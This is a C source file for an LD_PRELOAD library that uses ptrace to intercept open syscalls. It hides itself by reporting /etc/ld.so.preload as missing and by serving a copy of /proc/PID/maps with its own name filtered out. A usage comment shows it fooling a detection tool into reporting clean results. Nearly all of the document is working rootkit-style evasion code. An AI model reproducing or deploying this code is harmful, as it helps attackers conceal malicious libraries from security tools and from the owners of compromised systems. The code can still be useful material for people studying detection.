#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <limits.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <asm/unistd.h>

/*
gcc -o nosyscall_preload.so -shared -fpic -Wl,-init,init nosyscall_preload.c
LD_PRELOAD=./nosyscall_preload.so ./syscall_detect
/etc/ld.so.preload is not present
Memory maps are clean
*/

// Some useful defines to make the code architecture independent
#if defined(__i386__)
#define REG_SYSCALL ORIG_EAX
#define REG_SP esp
#define REG_IP eip 
#elif defined(__x86_64__)
#define REG_SYSCALL ORIG_RAX
#define REG_SP rsp
#define REG_IP rip 
#endif

long NOHOOK = 0;
char *soname = "nosyscall_preload.so";

void fakeMaps(char *original_path, char *fake_path, char *pattern)
{
    FILE *original, *fake;
    char buffer[PATH_MAX];
    original = fopen(original_path, "r");
    fake = fopen(fake_path, "w");
    // Copy original in fake but discard the lines containing pattern
    while(fgets(buffer, PATH_MAX, original))
        if(strstr(buffer, pattern) == NULL)
            fputs(buffer, fake);
    fclose(fake);
    fclose(original);
}

long open_gate(const char *path, long oflag, long cflag) 
{
    char real_path[PATH_MAX], maps_path[PATH_MAX];
    long ret;
    pid_t pid;
    pid = getpid();
    // Resolve symbolic links and dot notation fu
    realpath(path, real_path);
    snprintf(maps_path, PATH_MAX, "/proc/%d/maps", pid);
    if(strcmp(real_path, "/etc/ld.so.preload") == 0)
    {
        // This file does not exist, I swear.
        errno = ENOENT;
        ret = -1;
    }
    else if(strcmp(real_path, maps_path) == 0)
    {
        snprintf(maps_path, PATH_MAX, "/tmp/%d.fakemaps", pid);
        // Create a file in tmp containing our fake map
        NOHOOK = 1; // Entering NOHOOK section
        fakeMaps(real_path, maps_path, soname);
        ret = open(maps_path, oflag);
    }
    else
    {
        // Everything is ok, call the real open
        NOHOOK = 1; // Entering NOHOOK section
        ret = open(path, oflag, cflag);
    }
    // Exiting NOHOOK section
    NOHOOK = 0;
    #ifdef __i386__
    // Tricky stack cleaning and return in the x86 case
    // We need to clean the 3 arguments (12 bytes) that were pushed on the stack
    __asm__ __volatile__ ("mov %0, %%eax;" // set the return value
                          "mov (%%ebp), %%ecx;" // move saved ebp 12 bytes up
                          "mov %%ecx, 0xc(%%ebp);"
                          "mov 0x4(%%ebp), %%ecx;" // move saved eip 12 bytes up
                          "mov %%ecx, 0x10(%%ebp);"
                          "add $0xc, %%ebp;" //move stack base 12 bytes up
                          "leave;" // normal leave and return
                          "ret;"
                          :
                          :"m" (ret)
                          :
                          );
    #endif
    return ret;
}

void init()
{
    pid_t program;
    // Forking a child process
    program = fork();
    if(program != 0)
    {
        // Parent process which will debug the program in the child process
        int status;
        long syscall_nr;
        struct user_regs_struct regs;
        // We attach to the child
        if(ptrace(PTRACE_ATTACH, program) != 0)
        {
            printf("Failed to attach to the program.\n");
            exit(1);
        }
        waitpid(program, &status, 0);
        // We are only interested in tracing SYSCALLs
        ptrace(PTRACE_SETOPTIONS, program, 0, PTRACE_O_TRACESYSGOOD);
        while(1)
        {
            ptrace(PTRACE_SYSCALL, program, 0, 0);
            waitpid(program, &status, 0);
            if(WIFEXITED(status) || WIFSIGNALED(status))
                break; // Stop tracing if the parent process terminates
            else if(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP|0x80)
            {
                // Getting the syscall number
                syscall_nr = ptrace(PTRACE_PEEKUSER, program, sizeof(long)*REG_SYSCALL);
                // Is it an open syscall ?
                if(syscall_nr == __NR_open)
                {
                    // Getting the value of NOHOOK in the child process
                    NOHOOK = ptrace(PTRACE_PEEKDATA, program, (void*)&NOHOOK);
                    // Only hook the syscall if it's not in a NOHOOK section
                    if(!NOHOOK)
                    {
                        // Now we are going to simulate a call
                        // First get the register state
                        ptrace(PTRACE_GETREGS, program, 0, &regs);
                        // Under x86 we need to push the arguments on the stack
                        #ifdef __i386__
                        regs.REG_SP -= sizeof(long);
                        ptrace(PTRACE_POKEDATA, program, (void*)regs.REG_SP, regs.edx);
                        regs.REG_SP -= sizeof(long);
                        ptrace(PTRACE_POKEDATA, program, (void*)regs.REG_SP, regs.ecx);
                        regs.REG_SP -= sizeof(long);
                        ptrace(PTRACE_POKEDATA, program, (void*)regs.REG_SP, regs.ebx);
                        #endif
                        // Push return address on the stack
                        regs.REG_SP -= sizeof(long);
                        ptrace(PTRACE_POKEDATA, program, (void*)regs.REG_SP, regs.REG_IP);
                        // Set RIP to open_gate address
                        regs.REG_IP = (unsigned long) open_gate;
                        // Finnally set the register
                        ptrace(PTRACE_SETREGS, program, 0, &regs);
                    }
                }
                //We always get a second signal after the syscall
                ptrace(PTRACE_SYSCALL, program, 0, 0);
                waitpid(program, &status, 0);
            }
        }
        exit(0);
    }
    else
    {
        // Child process
        // Sleep a bit to give the parent process enough time to attach
        sleep(0);
    }
}
